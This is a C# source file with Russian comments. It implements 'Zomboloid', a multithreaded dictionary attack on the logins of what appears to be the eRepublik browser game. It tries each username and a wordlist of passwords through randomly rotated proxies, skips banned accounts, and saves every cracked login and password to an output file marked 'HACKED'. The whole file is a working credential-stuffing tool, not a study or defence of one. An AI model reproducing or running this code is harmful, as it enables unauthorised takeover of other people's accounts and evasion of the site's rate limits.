
using System;
using NerZul.Core.Utils;

namespace Engine
{


	public  class Zomboloid
	{
		private static NerZul.Core.Utils.StringSelector m_ProxyList;
		private static NerZul.Core.Utils.StringHolder m_NickNameList;
		private static string[] m_Dictionary;
		private class LoginPassword	{
			public string Login, Password;
			public LoginPassword(){}
			public LoginPassword(string login, string password)
			{
				Login=login; Password=password;
			}
		}
		private static System.Collections.Generic.List<LoginPassword> m_List;
		private static System.IO.TextWriter m_OutS;
		
		
		private static int m_ThreadCount=0;
		private static object m_ThreadCountLock=new Object();
		private static void zombolize_thread()
		{
			//Поток запущен же
			lock(m_ThreadCountLock)
			{
				m_ThreadCount++;
			}
			LoginPassword LPPair;
			while(true)
			{
				//Получаем новую пару логин/пароль или выходим
				lock(m_List)
				{
					//В текущем списке пусто?
					if(m_List.Count==0)
					{
						string nextvictim=m_NickNameList.GetNextString();
						//Там вообще кто-то ещё есть?
						if(nextvictim==null)
						{
							//Нам тут больше делать нечего, по ходу. Тормозим поток.
							lock(m_ThreadCountLock)
							{
								m_ThreadCount--;
							}
							return;
						}
						ConsoleLog.WriteLine("Trying to hack "+nextvictim+". "+
						                  m_NickNameList.m_List.Count+" left.");
						//Генерим набор, чо
						m_List.Add(new LoginPassword(nextvictim,nextvictim));
						foreach(string password in m_Dictionary)
						{
							m_List.Add(new LoginPassword(nextvictim,password));
						}
					}
					//Вытаскиваем из списка следующую пару логин/пасс
					LPPair=m_List[0];
					m_List.RemoveAt(0);
				}
				//Долго и упорно пытаемся залогиниться. Связь нестабильна, поэтому ждём
				//ответа именно от ерепки, а не от быдлопрокси, который считает, что он
				//тут самый умный и вообще
				string Answer=null;
				while(true)
				{
					NerZul.Core.Network.Bot bot=new NerZul.Core.Network.Bot(
					     Uri.EscapeDataString(LPPair.Login),
					     Uri.EscapeDataString(LPPair.Password),
                        "Opera/9.62 (Windows NT 6.1; U; ru) Presto/2.1.1", "", 0);
					bot.HttpClient.Proxy=m_ProxyList.GetRandomString();
					bool HasAnswer=false;
					try
					{
						bot.Login();
						HasAnswer=true;
					}catch(Exception){};
					//Если там не вылетел эксепшн - смотрим. Иначе - нахуй
					if(HasAnswer)
					{
						Answer=bot.GetLastResponse();
						//Если ответ таки от ерепки, думаем дальше
						if(Answer.Contains("href=\"/en/tickets")) break;
					}
				}
			
				//А куда мы попали?
				if(Answer.Contains("Permanent suspension"))
				{
					//Ух ты бля, оно в пермабане
					lock(m_List)
					{
						//Чистим список, если этого не сделали до нас
						if((m_List.Count>0)&&(m_List[0].Login==LPPair.Login))
						{
							m_List.Clear();
						}
					}
				}
				//Левый пасс, нэ?
				else if((Answer.Contains("Wrong password"))||
				        (Answer.Contains("Wrong citizen")))
				{
					//Эм. А ничего не делаем. Наверное
				}
				else
				{
					//О, кул, залогинились. Пишем в лог, чистим списки
					if((m_List.Count>0)&&(m_List[0].Login==LPPair.Login))
					{
						m_List.Clear();
					}
					m_OutS.WriteLine(LPPair.Login+"|"+LPPair.Password);
					m_OutS.Flush();
					ConsoleLog.WriteLine("HACKED: "+LPPair.Login+":"+LPPair.Password);
				}
				//Усё, а теперь следующую пару.
				System.Threading.Thread.Sleep(500);
			}
		
			
				
				
					
			
		}
		
		
		
		
		public static void zombolize(string[] args)
		{
			if(args.Length!=6)
			{
				ConsoleLog.WriteLine("Usage: zombolize loginlist dictionary proxylist threadcount outfile");
				return;
			}
			m_NickNameList=new NerZul.Core.Utils.StringHolder(args[1]);
			m_Dictionary=System.IO.File.ReadAllLines(args[2]);
			m_ProxyList=new NerZul.Core.Utils.StringSelector(args[3]);
			int ThreadCount=int.Parse(args[4]);
			m_OutS=new System.IO.StreamWriter(args[5]);
			m_List=new System.Collections.Generic.List<Engine.Zomboloid.LoginPassword>();
			
			for(int i=0; i<ThreadCount;i++)
			{
				new System.Threading.Thread(zombolize_thread).Start();
			}
			while(true)
			{
				System.Threading.Thread.Sleep(500);
				lock(m_ThreadCountLock)
				{
					if(m_ThreadCount<=0) return;
				}
			}
		}
	}
}
